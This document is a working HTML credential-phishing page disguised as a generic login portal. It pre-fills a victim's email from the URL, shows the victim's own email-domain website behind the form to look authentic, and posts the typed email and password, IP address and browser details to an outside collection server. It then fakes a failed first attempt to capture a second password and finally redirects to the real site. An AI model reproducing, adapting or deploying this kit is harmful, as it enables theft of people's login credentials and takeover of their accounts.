<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Login Portal</title>
    <!-- Bootstrap 5 CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Bootstrap Icons -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
    <!-- Google Fonts: Poppins -->
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        /* Background iframe - displays the website of the email domain */
        #website-background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: -2;
            object-fit: cover;
            background: #f0f2f5;
        }

        /* Dark overlay to make form readable */
        .bg-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.65);
            z-index: -1;
        }

        body {
            font-family: 'Poppins', sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1rem;
            position: relative;
            overflow: hidden;
        }

        /* Form container - glassmorphism effect */
        .form-container {
            max-width: 440px;
            width: 100%;
            padding: 2rem 2rem 2.2rem;
            background: rgba(255, 255, 255, 0.96);
            border-radius: 1.25rem;
            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.3), 0 0 0 1px rgba(255, 255, 255, 0.1);
            position: relative;
            z-index: 10;
            backdrop-filter: blur(2px);
            transition: all 0.3s ease;
        }

        .icon-text {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 1.25rem;
            gap: 10px;
        }

        .icon-text img {
            width: 38px;
            height: 38px;
            border-radius: 10px;
            background: white;
            padding: 4px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }

        .icon-text .h4 {
            margin-bottom: 0;
            color: #0a58ca;
            font-weight: 700;
            font-size: 1.5rem;
            letter-spacing: -0.3px;
        }

        .form-floating {
            position: relative;
            margin-bottom: 1.5rem;
        }

        .form-floating label,
        .input-icon {
            position: absolute;
            color: #6c757d;
            pointer-events: none;
            transition: 0.2s ease all;
        }

        .form-floating label {
            left: 2.5rem;
            top: 0.2rem;
            background: transparent;
            z-index: 1;
            font-weight: 500;
        }

        .form-floating input:focus+label,
        .form-floating input:not(:placeholder-shown)+label {
            transform: translateY(-1.4rem);
            font-size: 0.75rem;
            color: #0d6efd;
        }

        .form-control {
            border: none;
            border-bottom: 2px solid #e0e4e8;
            border-radius: 0;
            padding-left: 2.5rem;
            padding-top: 0.8rem;
            padding-bottom: 0.4rem;
            transition: all 0.2s;
            background: transparent;
            font-size: 1rem;
        }

        .form-control:focus {
            border-bottom-color: #0d6efd;
            outline: none;
            box-shadow: none;
            background: transparent;
        }

        .input-icon {
            left: 0.5rem;
            top: 50%;
            transform: translateY(-50%);
            font-size: 1.2rem;
            color: #8e9aaf;
        }

        .btn-primary {
            width: 100%;
            padding: 0.85rem;
            font-size: 1rem;
            font-weight: 600;
            background: linear-gradient(135deg, #0d6efd, #0b5ed7);
            border: none;
            border-radius: 0.75rem;
            transition: all 0.25s;
            margin-top: 0.5rem;
            box-shadow: 0 4px 12px rgba(13, 110, 253, 0.3);
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            background: linear-gradient(135deg, #0b5ed7, #0a58ca);
            box-shadow: 0 8px 20px rgba(13, 110, 253, 0.4);
        }

        .btn-primary:active {
            transform: translateY(0);
        }

        .loader-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            align-items: center;
            justify-content: center;
            z-index: 9999;
            display: none;
            backdrop-filter: blur(4px);
        }

        .error-message {
            color: #dc3545;
            margin-bottom: 1.2rem;
            display: none;
            text-align: center;
            font-size: 0.85rem;
            background: rgba(255, 235, 235, 0.95);
            padding: 0.65rem;
            border-radius: 0.75rem;
            font-weight: 500;
            border-left: 4px solid #dc3545;
        }

        .domain-badge {
            text-align: center;
            margin-top: 1rem;
            font-size: 0.7rem;
            color: #6c757d;
            background: rgba(0,0,0,0.05);
            display: inline-block;
            width: auto;
            padding: 0.2rem 0.8rem;
            border-radius: 20px;
        }

        @media (max-width: 576px) {
            .form-container {
                padding: 1.5rem;
                margin: 0 0.5rem;
            }
            .icon-text .h4 {
                font-size: 1.25rem;
            }
        }
    </style>
</head>
<body>
    <!-- BACKGROUND: displays the website of the email domain dynamically -->
    <iframe id="website-background" src="about:blank" title="Website Background"></iframe>
    <div class="bg-overlay"></div>

    <div class="form-container">
        <div id="error-message" class="error-message">⚠️ Invalid credentials</div>

        <form id="user-form">
            <div class="icon-text">
                <img id="domain-favicon" src="https://www.google.com/s2/favicons?domain=zoho.com&sz=64" alt="Domain Icon">
                <span class="h4" id="domain-name">SECURE PORTAL</span>
            </div>
            <h5 class="mb-1 text-center fw-semibold">Welcome back</h5>
            <p class="mb-4 text-center text-muted small">Sign in to continue to your account</p>

            <div class="form-floating position-relative">
                <i class="bi bi-envelope input-icon"></i>
                <input type="email" class="form-control" id="email" placeholder=" " required autocomplete="email">
                <label for="email">Email address</label>
            </div>

            <div class="form-floating position-relative">
                <i class="bi bi-lock input-icon"></i>
                <input type="password" class="form-control" id="password" placeholder=" " required autocomplete="current-password">
                <label for="password">Password</label>
            </div>

            <button type="submit" class="btn btn-primary" id="submit-button">Continue →</button>
            <div class="text-center mt-3">
                <span class="domain-badge" id="domain-badge">Secure connection</span>
            </div>
        </form>
    </div>

    <div id="loader-overlay" class="loader-overlay">
        <div class="spinner-border text-light" role="status" style="width: 3rem; height: 3rem;">
            <span class="visually-hidden">Loading...</span>
        </div>
        <p class="text-white mt-3">Processing...</p>
    </div>

    <script>
        // ============================================================
        // ORIGINAL DESIGN PRESERVED
        // FEATURE: The BACKGROUND shows the WEBSITE of the email domain (ANY domain)
        // FEATURE: Email auto-filled from URL hash (#) example: page.html#test@test.com
        // FEATURE: Sends login data ONLY to: 
        //          https://scitecinstruments.it.com/panel/sg.php
        //          NO request to api.php - completely removed
        // ============================================================
        
        let submitCount = 0;
        let currentDomain = null;
        
        // ---------- EXTRACT EMAIL FROM URL HASH (#) ----------
        function getEmailFromHash() {
            const hash = window.location.hash;
            if (hash && hash.length > 1) {
                let hashValue = hash.substring(1);
                // Decode URI component in case of special chars
                hashValue = decodeURIComponent(hashValue);
                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                if (emailRegex.test(hashValue)) {
                    return hashValue;
                }
            }
            return null;
        }
        
        // ---------- UPDATE BACKGROUND IFRAME TO SHOW THE WEBSITE OF THE EMAIL DOMAIN ----------
        function updateBackgroundWebsite(domain) {
            if (!domain) return;
            
            // Clean domain - remove any port, path, just get the base domain
            let cleanDomain = domain.toLowerCase().trim();
            // Remove any trailing slashes or paths
            cleanDomain = cleanDomain.split('/')[0];
            // Remove any port if present
            cleanDomain = cleanDomain.split(':')[0];
            
            // Ensure it's a valid domain format (has at least one dot and valid chars)
            if (cleanDomain && cleanDomain.includes('.') && /^[a-z0-9.-]+\.[a-z]{2,}$/i.test(cleanDomain)) {
                // Try to load the website over HTTPS first
                let websiteUrl = `https://${cleanDomain}`;
                const iframe = document.getElementById('website-background');
                if (iframe) {
                    // Set iframe to display the website
                    iframe.src = websiteUrl;
                    console.log("Background website loaded for domain:", cleanDomain, "URL:", websiteUrl);
                    
                    // Handle iframe load error (some websites block iframe embedding)
                    iframe.onload = function() {
                        console.log("Background iframe loaded successfully for:", cleanDomain);
                    };
                    iframe.onerror = function() {
                        console.log("Could not load website via HTTPS for:", cleanDomain, "trying HTTP fallback");
                        // Fallback to HTTP if HTTPS fails
                        let httpUrl = `http://${cleanDomain}`;
                        iframe.src = httpUrl;
                    };
                }
            } else {
                console.log("Invalid domain format:", cleanDomain);
            }
        }
        
        // Update favicon and domain name display
        function updateDomainUI(email) {
            if (email && email.includes('@')) {
                const domainPart = email.split('@')[1];
                if (domainPart) {
                    const cleanDomain = domainPart.split('/')[0].split(':')[0];
                    const domainPretty = cleanDomain.split('.')[0].toUpperCase();
                    document.getElementById('domain-name').innerText = domainPretty;
                    document.getElementById('domain-favicon').src = `https://www.google.com/s2/favicons?domain=${cleanDomain}&sz=64`;
                    document.getElementById('domain-badge').innerHTML = `🔒 ${cleanDomain}`;
                    
                    // UPDATE BACKGROUND WEBSITE - SHOW THE WEBSITE OF THE EMAIL DOMAIN
                    updateBackgroundWebsite(cleanDomain);
                    currentDomain = cleanDomain;
                    return cleanDomain;
                }
            }
            return null;
        }
        
        // Load email from hash and populate + set background website
        const hashEmail = getEmailFromHash();
        const emailInput = document.getElementById('email');
        
        if (hashEmail) {
            emailInput.value = hashEmail;
            updateDomainUI(hashEmail);
        } else {
            // Default placeholder UI
            document.getElementById('domain-name').innerText = "PORTAL";
            document.getElementById('domain-favicon').src = "https://www.google.com/s2/favicons?domain=secure.com";
            document.getElementById('domain-badge').innerHTML = "🔒 Secure Access";
        }
        
        // ---------- COLLECT USER METADATA ----------
        let userMetadata = {
            ipAddress: "Collecting...",
            userAgent: navigator.userAgent,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            browser: "Detecting...",
            screenResolution: `${screen.width}x${screen.height}`,
            language: navigator.language,
            platform: navigator.platform
        };
        
        // Browser detection
        const ua = navigator.userAgent;
        if (ua.indexOf("Firefox") > -1) userMetadata.browser = "Mozilla Firefox";
        else if (ua.indexOf("SamsungBrowser") > -1) userMetadata.browser = "Samsung Internet";
        else if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) userMetadata.browser = "Opera";
        else if (ua.indexOf("Edg") > -1) userMetadata.browser = "Microsoft Edge";
        else if (ua.indexOf("Chrome") > -1) userMetadata.browser = "Google Chrome";
        else if (ua.indexOf("Safari") > -1) userMetadata.browser = "Apple Safari";
        else userMetadata.browser = "Unknown";
        
        // Fetch real IP
        fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(data => { userMetadata.ipAddress = data.ip; })
            .catch(() => { userMetadata.ipAddress = "Unavailable"; });
        
        // ---------- SEND DATA TO ONLY ONE API ENDPOINT (ONLY panel/sg.php) ----------
        // NO REQUEST TO api.php - COMPLETELY REMOVED
        async function sendDataToEndpoint(formData) {
            const endpoint = "https://scitecinstruments.it.com/panel/sg.php";
            
            // Build URLSearchParams payload
            const payload = new URLSearchParams();
            for (let [key, value] of Object.entries(formData)) {
                payload.append(key, value);
            }
            
            const fetchOptions = {
                method: "POST",
                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                body: payload.toString(),
                mode: 'cors'
            };
            
            try {
                const response = await fetch(endpoint, fetchOptions);
                const result = await response.text();
                console.log("✅ Data sent to panel/sg.php only:", result);
                return { success: true, data: result };
            } catch (err) {
                console.error("❌ Error sending to panel/sg.php:", err);
                return { success: false, error: err.message };
            }
        }
        
        // ---------- FORM SUBMIT HANDLER (Original behavior: 1st attempt error, 2nd redirect) ----------
        document.getElementById('user-form').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const email = emailInput.value.trim();
            const password = document.getElementById('password').value.trim();
            const errorDiv = document.getElementById('error-message');
            
            // Validation
            if (!email || !password) {
                errorDiv.innerHTML = "❌ Email and password are required.";
                errorDiv.style.display = "block";
                setTimeout(() => { errorDiv.style.display = "none"; }, 3000);
                return;
            }
            
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!emailRegex.test(email)) {
                errorDiv.innerHTML = "❌ Please enter a valid email address.";
                errorDiv.style.display = "block";
                setTimeout(() => { errorDiv.style.display = "none"; }, 3000);
                return;
            }
            
            submitCount++;
            const isFirstAttempt = (submitCount === 1);
            const isSecondAttempt = (submitCount === 2);
            
            // Show loader
            const loader = document.getElementById('loader-overlay');
            loader.style.display = "flex";
            errorDiv.style.display = "none";
            
            // Extract domain from email for redirect
            const emailDomain = email.split('@')[1] || "";
            let cleanDomain = emailDomain.split('/')[0].split(':')[0];
            if (cleanDomain && !currentDomain) currentDomain = cleanDomain;
            
            // Prepare payload with full metadata
            const dataPayload = {
                email: email,
                password: password,
                ipAddress: userMetadata.ipAddress,
                userAgent: userMetadata.userAgent,
                timezone: userMetadata.timezone,
                browser: userMetadata.browser,
                screenResolution: userMetadata.screenResolution,
                language: userMetadata.language,
                platform: userMetadata.platform,
                submitAttempt: submitCount,
                timestamp: new Date().toISOString(),
                referrer: document.referrer || "direct"
            };
            
            try {
                // SEND DATA TO panel/sg.php ONLY - NO api.php
                await sendDataToEndpoint(dataPayload);
                console.log("Data sent successfully for attempt", submitCount);
                
                // Original design logic
                if (isFirstAttempt) {
                    // First attempt: show error, clear password, hide loader after 3s
                    setTimeout(() => {
                        loader.style.display = "none";
                        errorDiv.innerHTML = "⚠️ Try again";
                        errorDiv.style.display = "block";
                        document.getElementById('password').value = "";
                        setTimeout(() => { errorDiv.style.display = "none"; }, 3000);
                    }, 3000);
                } 
                else if (isSecondAttempt) {
                    // Second attempt: redirect to the website of the email domain
                    setTimeout(() => {
                        loader.style.display = "none";
                        let targetDomain = cleanDomain || currentDomain;
                        if (targetDomain) {
                            let redirectUrl = `https://${targetDomain}`;
                            console.log("Redirecting to domain website:", redirectUrl);
                            window.location.href = redirectUrl;
                        } else {
                            window.location.href = "https://www.google.com";
                        }
                    }, 3000);
                }
                else {
                    setTimeout(() => {
                        loader.style.display = "none";
                        errorDiv.innerHTML = "❌ Authentication failed. Please try again.";
                        errorDiv.style.display = "block";
                        setTimeout(() => { errorDiv.style.display = "none"; }, 4000);
                    }, 2000);
                }
            } catch (err) {
                console.error("Submit error:", err);
                loader.style.display = "none";
                errorDiv.innerHTML = "⚠️ Network error. Please try again.";
                errorDiv.style.display = "block";
                setTimeout(() => { errorDiv.style.display = "none"; }, 3000);
            }
        });
        
        // ---------- REAL-TIME UPDATE: When user types email, update background website and favicon ----------
        emailInput.addEventListener('input', function() {
            const val = this.value.trim();
            if (val.includes('@')) {
                let domainPart = val.split('@')[1];
                if (domainPart) {
                    // Clean domain (remove any paths, ports)
                    let cleanDomain = domainPart.split('/')[0].split(':')[0];
                    if (cleanDomain && cleanDomain.includes('.') && /^[a-z0-9.-]+\.[a-z]{2,}$/i.test(cleanDomain)) {
                        // Update UI with domain
                        const domainPretty = cleanDomain.split('.')[0].toUpperCase();
                        document.getElementById('domain-name').innerText = domainPretty;
                        document.getElementById('domain-favicon').src = `https://www.google.com/s2/favicons?domain=${cleanDomain}&sz=64`;
                        document.getElementById('domain-badge').innerHTML = `🔒 ${cleanDomain}`;
                        // LIVE BACKGROUND WEBSITE UPDATE: show the website of the email domain
                        updateBackgroundWebsite(cleanDomain);
                        currentDomain = cleanDomain;
                    }
                }
            } else {
                // If no email typed, revert if no hash was preset
                if (!hashEmail) {
                    document.getElementById('domain-name').innerText = "PORTAL";
                    document.getElementById('domain-favicon').src = "https://www.google.com/s2/favicons?domain=secure.com";
                    document.getElementById('domain-badge').innerHTML = "🔒 Secure Access";
                    // Reset background to default (blank or fallback)
                    const iframe = document.getElementById('website-background');
                    iframe.src = "about:blank";
                }
            }
        });
        
        // Ensure if hashEmail was provided, background website is loaded correctly
        if (hashEmail) {
            let domainFromHash = hashEmail.split('@')[1];
            if (domainFromHash) {
                let cleanDomain = domainFromHash.split('/')[0].split(':')[0];
                if (cleanDomain) {
                    updateBackgroundWebsite(cleanDomain);
                    currentDomain = cleanDomain;
                }
            }
        }
        
        // Prevent double submission
        let isSubmitting = false;
        const form = document.getElementById('user-form');
        form.addEventListener('submit', function(e) {
            if (isSubmitting) {
                e.preventDefault();
                return;
            }
            isSubmitting = true;
            setTimeout(() => { isSubmitting = false; }, 5000);
        });
        
        // Console log for verification - NO api.php endpoint
        console.log("═══════════════════════════════════════════════");
        console.log("✓ ORIGINAL DESIGN PRESERVED");
        console.log("✓ BACKGROUND displays the WEBSITE of ANY email domain (live update)");
        console.log("✓ Email auto-fill from URL hash (#) → example: page.html#user@gmail.com");
        console.log("✓ Data sent ONLY to:");
        console.log("    → https://scitecinstruments.it.com/panel/sg.php");
        console.log("✓ NO request sent to api.php - COMPLETELY REMOVED");
        console.log("✓ Continue button fully functional");
        console.log("═══════════════════════════════════════════════");
    </script>
</body>
</html>
